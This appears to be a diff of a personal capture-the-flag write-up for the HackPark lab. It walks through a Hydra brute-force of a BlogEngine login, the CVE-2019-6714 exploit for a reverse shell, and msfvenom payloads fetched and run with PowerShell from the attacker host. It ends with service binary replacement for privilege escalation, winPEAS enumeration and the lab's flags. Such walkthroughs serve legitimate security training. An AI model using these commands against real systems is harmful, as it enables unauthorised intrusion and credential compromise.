@@ -16,7 +16,6 @@ or
 
 download image and search on google images , or using yandex (but is written in russian)
 
-
 PennyWise
 
 ```
@@ -30,8 +29,6 @@ Whats the name of the clown displayed on the homepage?
 Hydra is a parallelized, fast and flexible login cracker. If you don't have Hydra installed or need a Linux machine to use it, you can deploy a powerful Kali Linux machine and control it in your browser!
 
 Brute-forcing can be trying every combination of a password. Dictionary-attack's are also a type of brute-forcing, where we iterating through a wordlist to obtain the password.
-
-
 
 We need to find a login page to attack and identify what type of request the form is making to the webserver. Typically, web servers make two types of requests, a GET request which is used to request data from a webserver and a POST request which is used to send data to a server.
 
@@ -50,9 +47,7 @@ or
 └─$ curl -s http://10.10.97.210/Account/login.aspx?ReturnURL=/admin/ | grep "<form"
     <form method="post" action="login.aspx?ReturnURL=%2fadmin%2f" id="Form1">
 
-
 using burpsuite and hydra
-
 
 POST /Account/login.aspx?ReturnURL=%2fadmin%2f HTTP/1.1
 
@@ -78,8 +73,6 @@ Referer: http://10.10.97.210/Account/login.aspx?ReturnURL=%2fadmin%2f
 
 Upgrade-Insecure-Requests: 1
 
-
-
 __VIEWSTATE=savs4w5xqq5WN1BwyyEabVd2wCjIHbtPaIzFXyli0Hro5Z%2BIBinh%2BoGn8tvVKr1%2FTlGup1EuUA0ZBMtp3HRW2S6OkqH7hS2txGcnULjZsHRm7kSndR8xZMFIuyVcDMo3Rk%2FBG7aBZUmPtrYKC5an0BxHd5Uj%2FSghlV6rpjW5wOJA7qA5SmA3l1dZsjf%2FOZC6604p1bA%2BWaCXqojeVCVe56bIgRk%2FpFz17kbJr5M92Xu56xNDqpWcb%2BswOEdSNyTiTqYEpPgNE0RHyFnFeH67KOSNmBXJy2m5QS%2Fsv1jN77dqygGjB%2FsUqdzSg%2FQCCWF9jvPPeqd8yvZr4VJzXsbq5Dqa4Wrw9ebPT8Otp757fPC543EH&__EVENTVALIDATION=WN2%2BrJK%2FRbdWWf5QzfkOh3ZxWugDIs8I71cy1eGi%2BCEHlhHGgGG0F5LyD4fBmlTa3Byi1qHu5QFbMENwxtj6whqxw57RpdgghX3py30FH%2FHPpYN9PvQh1sOrSUZy2tM1kLhEhAFky2Vm27AboCtZZYMph3qP8o0SVvRpaYe%2BD7jDJZsC&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=admin&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in
 
 so
@@ -98,7 +91,6 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-27 13:34:
 
 admin:1qaz2wsx
 
-
 Let's break down the parameters that we have passed to hydra.
 
     -l → login/username
@@ -107,29 +99,17 @@ Let's break down the parameters that we have passed to hydra.
 
 3.   Http-post-form → request data form that is sent to the web server via the browser.
 
-
-
 Replace the Username and Password field with “^USER^” & “^PASS^” respectively in the web form request, as hydra will be targeting these parameters for the brute force.
 
 You might have noticed that we added an additional parameter of “Login Failed” at the end of the post form data. This is an error we observed after someone enters wrong credentials.
 
-
-
 ```
-
-![[Pasted image 20220927121222.png]]
-
-
-![[Pasted image 20220927123705.png]]
 
 What request type is the Windows website login form using?
 
 *POST*
 
-
 Now we know the request type and have a URL for the login form, we can get started brute-forcing an account.
-
-![[Pasted image 20220927122543.png]]
 
 Run the following command but fill in the blanks:
 
@@ -139,7 +119,6 @@ Guess a username, choose a password wordlist and gain credentials to a user acco
 Username is admin... But what is the password?
 
 *1qaz2wsx*
-
 
 Hydra really does have lots of functionality, and there are many "modules" available (an example of a module would be the http-post-form that we used above).
 
@@ -157,7 +136,6 @@ Below is a mini cheatsheet:
 	hydra -l <username> -P .<password list> $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
 	Craft a more specific request for Hydra to brute force.
 
-
 ### Compromise the machine 
 
 ![](https://i.imgur.com/FhJQrqE.png)
@@ -170,7 +148,6 @@ Exploit-Database is a CVE (common vulnerability and exposures) archive of public
 log in 
 
 then click about
-
 
 Your BlogEngine.NET Specification
 
@@ -186,7 +163,6 @@ vulnerability blogengine 3.3.6.0 (googling)
 
 https://www.exploit-db.com/exploits/46353
 
-
 Let’s follow the instructions:
 
     Start by modifying the script so that we report the correct value for IP and port.
@@ -199,7 +175,6 @@ Let’s follow the instructions:
     Go to http://10.10.79.198/?theme=../../App_Data/files
 
 Check your listener, you should now have a reverse shell. 
-
 
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ nano 46353.cs 
@@ -219,11 +194,7 @@ Ncat: Connection from 10.10.97.210:49285.
 Microsoft Windows [Version 6.3.9600]
 (c) 2013 Microsoft Corporation. All rights reserved.
 
-
-
 ```
-
-
 
 Now you have logged into the website, are you able to identify the version of the BlogEngine?
 *3.3.6.0*
@@ -234,8 +205,6 @@ What is the CVE?
 Look on the exploit database page. Answer is in the format: CVE-YEAR-NUMBER
 
 *CVE-2019-6714 *
-
-![[Pasted image 20220927125117.png]]
 
 Using the public exploit, gain initial access to the server.
 
@@ -250,8 +219,6 @@ In this task we will learn about the basics of Windows Privilege Escalation.
 
 First we will pivot from netcat to a meterpreter session and use this to enumerate the machine to identify potential vulnerabilities. We will then use this gathered information to exploit the system and become the Administrator.
 
-
-
 Our netcat session is a little unstable, so lets generate another reverse shell using msfvenom.
 
 If you don't know how to do this, I suggest completing the Metasploit room first!
@@ -259,7 +226,6 @@ If you don't know how to do this, I suggest completing the Metasploit room first
 ![](https://i.imgur.com/lXRXJ5a.png)
 
 Tip: You can generate the reverse-shell payload using msfvenom, upload it using your current netcat session and execute it manually!
-
 
 ```
 ┌──(kali㉿kali)-[~/Downloads]
@@ -315,7 +281,6 @@ c:\Windows\Temp>dir
 .\revshell.exe
 c:\Windows\Temp>.\revshell.exe
 
-
 ┌──(kali㉿kali)-[~/Downloads/hackpark]
 └─$ msfconsole -q
 msf6 > use exploit/multi/handler
@@ -330,10 +295,8 @@ msf6 exploit(multi/handler) > run
 
 [*] Started reverse TCP handler on 10.11.81.220:2345 
 
-
 .\revshell.exe
 c:\Windows\Temp>.\revshell.exe
-
 
 ┌──(kali㉿kali)-[~/Downloads/hackpark]
 └─$ msfconsole -q
@@ -359,7 +322,6 @@ System Language : en_US
 Domain          : WORKGROUP
 Logged On Users : 1
 Meterpreter     : x86/windows
-
 
 ```
 
@@ -929,12 +891,9 @@ meterpreter > cat 20198415519.INI_LOG.txt
 
 ```
 
-
 What is the name of the binary you're supposed to exploit? 
  have you checked for logs for the abnormal service?
 *Message.exe*
-
-
 
 ```
 meterpreter > cd "c:\users"
@@ -959,9 +918,7 @@ meterpreter > cd jeff
 
 Time to replace C:\Program Files (x86)\SystemScheduler\Message.exe with a reverse shell. Let’s first generate a new reverse shell (use a new port) that we will name Message.exe: 
 
-
 stop this meterpreter in order to work then create a new one to get admin priv
-
 
 ┌──(kali㉿kali)-[~/Downloads/hackpark]
 └─$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.11.81.220 LPORT=3456 -f exe -o Message.exe
@@ -1037,7 +994,6 @@ C:\Program Files (x86)\SystemScheduler>.\Message.exe
 powershell -c "Invoke-WebRequest -Uri 'http://10.11.81.220:8000/Message.exe' -OutFile 'C:\Program Files (x86)\SystemScheduler\Message.exe'"
 .\Message.exe
 
-
 ┌──(kali㉿kali)-[~/Downloads/hackpark]
 └─$ msfconsole -q
 msf6 > use exploit/multi/handler
@@ -1087,11 +1043,7 @@ Mode              Size  Type  Last modified              Name
 meterpreter > cat root.txt
 7e13d97f05f7ceb9881a3eb3d78d3e72
 
-
-
-
 ```
-
 
 Using this abnormal service, escalate your privileges!
 
@@ -1099,7 +1051,6 @@ What is the user flag (on Jeffs Desktop)?
  Check exploit-db.com for a public writeup of this vulnerability. The missing binary isn't the same as the public exploit.
 
 *759bd8af507517bcfaede78a21a73e39*
-
 
 What is the root flag?
 *7e13d97f05f7ceb9881a3eb3d78d3e72*
@@ -1111,7 +1062,6 @@ What is the root flag?
 In this task we will escalate our privileges without the use of meterpreter/metasploit! 
 
 Firstly, we will pivot from our netcat session that we have established, to a more stable reverse shell.
-
 
 ```
 
@@ -1149,7 +1099,6 @@ Message.exe  revshell.exe  winPEAS.bat
 ┌──(kali㉿kali)-[~/Downloads/hackpark]
 └─$ python3 -m http.server 
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-
 
 powershell -c "Invoke-WebRequest -Uri 'http://10.11.81.220:8000/winPEAS.bat' -OutFile 'C:\Windows\Temp\winpeas.exe'"
 
@@ -4788,7 +4737,6 @@ Looking inside HKCU\Software\TightVNC\Server
 Looking inside HKCU\Software\SimonTatham\PuTTY\Sessions                                                          
 Looking inside HKCU\Software\OpenSSH\Agent\Keys                 
 
-
 8/3/2019, 10:43:23 AM  
 
 not appears to me Original Install Date prolly is another version winpeas
@@ -4839,24 +4787,17 @@ Registered Organization:
 Product ID:                00252-10000-00000-AA228
 Original Install Date:     8/3/2019, 10:43:23 AM
 
-
 ```
-
 
 Once we have established this we will use winPEAS to enumerate the system for potential vulnerabilities, before using this information to escalate to Administrator.
 
-
 Now we can generate a more stable shell using msfvenom, instead of using a meterpreter, This time let's set our payload to windows/shell_reverse_tcp
-
-
 
 After generating our payload we need to pull this onto the box using powershell.
 
 	Tip: It's common to find C:\Windows\Temp is world writable!
 
 	powershell -c "Invoke-WebRequest -Uri 'ip/shell.exe' -OutFile 'C:\Windows\Temp\shell.exe'"
-
-
 
 Now you know how to pull files from your machine to the victims machine, we can pull winPEAS.bat to the system using the same method! (You can find winPEAS [here](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASbat))
 
@@ -4867,9 +4808,5 @@ WinPeas is a great tool which will enumerate the system and attempt to recommend
 Using winPeas, what was the Original Install time? (This is date and time)
 
 *8/3/2019, 10:43:23 AM*
-
-
-
-
 
 [[Alfred]]
